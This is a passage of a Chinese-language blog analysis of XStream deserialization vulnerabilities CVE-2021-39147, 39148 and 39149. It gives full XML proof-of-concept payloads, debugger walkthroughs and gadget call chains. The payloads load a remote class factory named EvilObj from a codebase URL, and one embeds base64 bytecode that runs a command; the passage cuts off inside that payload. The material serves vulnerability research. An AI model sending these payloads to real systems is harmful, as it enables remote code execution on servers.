&lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                            &lt;string&gt;http://127.0.0.1:2333/&lt;/string&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;rdn class=&#x27;javax.naming.CompositeName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                &lt;javax.naming.CompositeName&gt;</span><br><span class="line">                                  &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                &lt;/javax.naming.CompositeName&gt;</span><br><span class="line">                              &lt;/rdn&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                              &lt;attrID&gt;javaClassName&lt;/attrID&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                            &lt;string&gt;foo&lt;/string&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;rdn class=&#x27;javax.naming.CompositeName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                &lt;javax.naming.CompositeName&gt;</span><br><span class="line">                                  &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                &lt;/javax.naming.CompositeName&gt;</span><br><span class="line">                              &lt;/rdn&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                          &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;ordered&gt;false&lt;/ordered&gt;</span><br><span class="line">                              &lt;attrID&gt;javaFactory&lt;/attrID&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                            &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                            &lt;string&gt;EvilObj&lt;/string&gt;</span><br><span class="line">                          &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                            &lt;default&gt;</span><br><span class="line">                              &lt;rdn class=&#x27;javax.naming.CompositeName&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                &lt;javax.naming.CompositeName&gt;</span><br><span class="line">                                  &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                &lt;/javax.naming.CompositeName&gt;</span><br><span class="line">                              &lt;/rdn&gt;</span><br><span class="line">                            &lt;/default&gt;</span><br><span class="line">                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                       &lt;/javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                      &lt;/attributes&gt;</span><br><span class="line">                    &lt;/com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                  &lt;/entries&gt;</span><br><span class="line">                &lt;/aliases&gt;</span><br><span class="line">              &lt;/it&gt;</span><br><span class="line">            &lt;/mm&gt;</span><br><span class="line">          &lt;/multiPart&gt;</span><br><span class="line">        &lt;/sm&gt;</span><br><span class="line">      &lt;/message&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27; /&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>从RdnEntry到KeyStoreResolver$KeyStoreIterator与39145是完全相同的，这里直接从findNextCert方法开始（从这里开始不同）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132049728.png" alt="image-20230413204918623"></p>
<p>判断是否有下一个元素，进入hasMoreElements方法查看。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132050272.png" alt="image-20230413205025177"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132050498.png" alt="image-20230413205041384"></p>
<p>返回true，说明有下一个元素，回到findNextCert方法中来，进入while循环：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132051883.png" alt="image-20230413205112758"></p>
<p>调用nextElement方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132051740.png" alt="image-20230413205142612"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132051307.png" alt="image-20230413205154237"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132052159.png" alt="image-20230413205208055"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132052655.png" alt="image-20230413205252574"></p>
<p>这些都和39145相同，调用createItem方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132059191.png" alt="image-20230413205924086"></p>
<p>在createItem方法中，同样也是判断javaClassName是否非空，则调用decodeObject方法创建Reference：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132101892.png" alt="image-20230413210111761"></p>
<p>然后调用getObjectInstance方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132101080.png" alt="image-20230413210149969"></p>
<p>在getObjectInstance方法中将Reference（ref）继续传递给getObjectFactoryFromReference方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132102671.png" alt="image-20230413210243566"></p>
<p>在getObjectFactoryFromReference方法中同样也是先从本地加载工厂类，加载不到再从远程codebase加载，然后实例化：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132103789.png" alt="image-20230413210354671"></p>
<p>与<a href="#CVE-2021-39145">CVE-2021-39145</a>完全一样，这里只是粗略的说一说，详细的话请看<a href="#CVE-2021-39145">CVE-2021-39145</a>。</p>
<p>调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">at javax.naming.spi.NamingManager.getObjectFactoryFromReference</span><br><span class="line">at javax.naming.spi.DirectoryManager.getObjectInstance</span><br><span class="line">at com.sun.jndi.ldap.LdapSearchEnumeration.createItem</span><br><span class="line">at com.sun.jndi.ldap.LdapSearchEnumeration.createItem</span><br><span class="line">at com.sun.jndi.ldap.AbstractLdapNamingEnumeration.nextAux</span><br><span class="line">at com.sun.jndi.ldap.AbstractLdapNamingEnumeration.nextImpl</span><br><span class="line">at com.sun.jndi.ldap.AbstractLdapNamingEnumeration.next</span><br><span class="line">at com.sun.jndi.ldap.AbstractLdapNamingEnumeration.nextElement</span><br><span class="line">at com.sun.jndi.ldap.AbstractLdapNamingEnumeration.nextElement</span><br><span class="line">at com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.findNextCert</span><br><span class="line">at com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.hasNext</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.makeProgress</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.parseAll</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.getAttachments</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parseAll</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parse</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimeMultipart.getCount</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.soap.MessageImpl.initializeAllAttachments</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.soap.MessageImpl.getAttachments</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage$SAAJAttachmentSet.&lt;init&gt;</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage.getAttachments</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage.copy</span><br><span class="line">at com.sun.xml.internal.ws.api.message.MessageWrapper.copy</span><br><span class="line">at com.sun.xml.internal.ws.api.message.Packet.toString</span><br><span class="line">at com.sun.org.apache.xpath.internal.objects.XString.equals</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">at java.util.TreeMap.put</span><br><span class="line">at java.util.AbstractMap.putAll</span><br><span class="line">at java.util.TreeMap.putAll</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2021-39148"><a href="#CVE-2021-39148" class="headerlink" title="CVE-2021-39148"></a>CVE-2021-39148</h2><h3 id="分析-25"><a href="#分析-25" class="headerlink" title="分析"></a>分析</h3><p>同样是远程拉取类并实例化造成RCE的漏洞，简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">        &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">        &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">        &lt;bodyParts/&gt;</span><br><span class="line">        &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">          &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">            &lt;soapPart/&gt;</span><br><span class="line">            &lt;mm&gt;</span><br><span class="line">              &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.ContextEnumerator&#x27;&gt;</span><br><span class="line">                  &lt;children class=&#x27;javax.naming.directory.BasicAttribute$ValuesEnumImpl&#x27;&gt;</span><br><span class="line">                    &lt;list class=&#x27;com.sun.xml.internal.dtdparser.SimpleHashtable&#x27;&gt;</span><br><span class="line">                      &lt;current&gt;</span><br><span class="line">                        &lt;hash&gt;1&lt;/hash&gt;</span><br><span class="line">                        &lt;key class=&#x27;javax.naming.Binding&#x27;&gt;</span><br><span class="line">                          &lt;name&gt;ysomap&lt;/name&gt;</span><br><span class="line">                            &lt;boundObj class=&#x27;com.sun.jndi.ldap.LdapReferralContext&#x27;&gt;</span><br><span class="line">                              &lt;refCtx class=&#x27;javax.naming.spi.ContinuationDirContext&#x27;&gt;</span><br><span class="line">                                &lt;cpe&gt;</span><br><span class="line">                                  &lt;resolvedObj class=&#x27;javax.naming.Reference&#x27;&gt;</span><br><span class="line">                                    &lt;className&gt;EvilObj&lt;/className&gt;</span><br><span class="line">                                    &lt;addrs/&gt;</span><br><span class="line">                                    &lt;classFactory&gt;EvilObj&lt;/classFactory&gt;</span><br><span class="line">                                    &lt;classFactoryLocation&gt;http://127.0.0.1:2333/&lt;/classFactoryLocation&gt;</span><br><span class="line">                                  &lt;/resolvedObj&gt;</span><br><span class="line">                                &lt;/cpe&gt;</span><br><span class="line">                              &lt;/refCtx&gt;</span><br><span class="line">                            &lt;/boundObj&gt;</span><br><span class="line">                        &lt;/key&gt;</span><br><span class="line">                      &lt;/current&gt;</span><br><span class="line">                    &lt;/list&gt;</span><br><span class="line">                  &lt;/children&gt;</span><br><span class="line">                  &lt;currentReturned&gt;true&lt;/currentReturned&gt;</span><br><span class="line">                  &lt;rootProcessed&gt;true&lt;/rootProcessed&gt;</span><br><span class="line">                  &lt;scope&gt;2&lt;/scope&gt;</span><br><span class="line">                &lt;/aliases&gt;</span><br><span class="line">              &lt;/it&gt;</span><br><span class="line">            &lt;/mm&gt;</span><br><span class="line">          &lt;/multiPart&gt;</span><br><span class="line">        &lt;/sm&gt;</span><br><span class="line">      &lt;/message&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27; /&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>这次也是KeyStoreResolver$KeyStoreIterator中开始：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132114964.png" alt="image-20230413211440860"></p>
<p>判断是否有下个元素。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132116807.png" alt="image-20230413211613733"></p>
<p>结果返回true。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132136421.png" alt="image-20230413213629340"></p>
<p>进入while循环，调用nextElement方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132137031.png" alt="image-20230413213739932"></p>
<p>进入getNextDescendant方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132138650.png" alt="image-20230413213818572"></p>
<p>第一个if为false，else-if也为false，进入else分支，执行prepNextChild方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132139847.png" alt="image-20230413213938750"></p>
<p>获取下一个元素，然后调用newEnumerator方法。currentChild.getObject()获取的是LdapReferralContext对象。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132141042.png" alt="image-20230413214102925"></p>
<p>调用getImmediateChildren将LdapReferralContext对象传递。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132142736.png" alt="image-20230413214207633"></p>
<p>调用LdapReferralContext对象的listBindings方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132143662.png" alt="image-20230413214309582"></p>
<p>调用refCtx属性（ContinuationDirContext）的listBindings方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132144476.png" alt="image-20230413214400386"></p>
<p>调用getTargetContext方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132145806.png" alt="image-20230413214512709"></p>
<p>调用cpe属性的getResolvedObj获取resolvedObj（Reference）。然后调用getContext方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132146689.png" alt="image-20230413214656619"></p>
<p>只需要关注第一个参数即可，然后调用getObjectInstance方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132147170.png" alt="image-20230413214731067"></p>
<p>接着在getObjectInstance方法里调用了getObjectFactoryFromReference方法，该方法想必很熟悉了。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304131729062.png" alt="image-20230413172923929"></p>
<p>远程加载类并实例化，造成RCE。</p>
<p>调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">at javax.naming.spi.NamingManager.getObjectFactoryFromReference</span><br><span class="line">at javax.naming.spi.NamingManager.getObjectInstance</span><br><span class="line">at javax.naming.spi.NamingManager.getContext</span><br><span class="line">at javax.naming.spi.ContinuationContext.getTargetContext</span><br><span class="line">at javax.naming.spi.ContinuationContext.listBindings</span><br><span class="line">at com.sun.jndi.ldap.LdapReferralContext.listBindings</span><br><span class="line">at com.sun.jndi.ldap.LdapReferralContext.listBindings</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.getImmediateChildren</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.&lt;init&gt;</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.newEnumerator</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.prepNextChild</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.getNextDescendant</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.next</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.nextElement</span><br><span class="line">at com.sun.jndi.toolkit.dir.ContextEnumerator.nextElement</span><br><span class="line">at com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.findNextCert</span><br><span class="line">at com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.hasNext</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.makeProgress</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.parseAll</span><br><span class="line">at com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.getAttachments</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parseAll</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parse</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimeMultipart.getCount</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.soap.MessageImpl.initializeAllAttachments</span><br><span class="line">at com.sun.xml.internal.messaging.saaj.soap.MessageImpl.getAttachments</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage$SAAJAttachmentSet.&lt;init&gt;</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage.getAttachments</span><br><span class="line">at com.sun.xml.internal.ws.message.saaj.SAAJMessage.copy</span><br><span class="line">at com.sun.xml.internal.ws.api.message.MessageWrapper.copy</span><br><span class="line">at com.sun.xml.internal.ws.api.message.Packet.toString</span><br><span class="line">at com.sun.org.apache.xpath.internal.objects.XString.equals</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">at javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">at java.util.TreeMap.put</span><br><span class="line">at java.util.AbstractMap.putAll</span><br><span class="line">at java.util.TreeMap.putAll</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2021-39149"><a href="#CVE-2021-39149" class="headerlink" title="CVE-2021-39149"></a>CVE-2021-39149</h2><h3 id="分析-26"><a href="#分析-26" class="headerlink" title="分析"></a>分析</h3><p>该漏洞直接造成RCE，修正后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;linked-hash-set&gt;</span><br><span class="line">  &lt;dynamic-proxy&gt;</span><br><span class="line">    &lt;interface&gt;map&lt;/interface&gt;</span><br><span class="line">    &lt;handler class=&#x27;com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl&#x27;&gt;</span><br><span class="line">	  &lt;classToInvocationHandler class=&#x27;linked-hash-map&#x27;/&gt;</span><br><span class="line">      &lt;defaultHandler class=&#x27;sun.tracing.NullProvider&#x27;&gt;</span><br><span class="line">        &lt;active&gt;true&lt;/active&gt;</span><br><span class="line">        &lt;providerType&gt;java.lang.Object&lt;/providerType&gt;</span><br><span class="line">        &lt;probes&gt;</span><br><span class="line">          &lt;entry&gt;</span><br><span class="line">            &lt;method&gt;</span><br><span class="line">              &lt;class&gt;java.lang.Object&lt;/class&gt;</span><br><span class="line">              &lt;name&gt;hashCode&lt;/name&gt;</span><br><span class="line">              &lt;parameter-types/&gt;</span><br><span class="line">            &lt;/method&gt;</span><br><span class="line">            &lt;sun.tracing.dtrace.DTraceProbe&gt;</span><br><span class="line">              &lt;proxy class=&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27; serialization=&#x27;custom&#x27; &gt;</span><br><span class="line">                &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">                  &lt;default&gt;</span><br><span class="line">                    &lt;__name&gt;Pwnr&lt;/__name&gt;</span><br><span class="line">                    &lt;__bytecodes&gt;</span><br><span class="line">                      &lt;byte-array&gt;yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAbeXNvc2VyaWFsL1B3bmVyNjMzNTA1NjA2NTkzAQAdTHlzb3NlcmlhbC9Qd25lcjYzMzUwNTYwNjU5MzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAk=&lt;/byte-array&gt;</span><br><span class="line">                      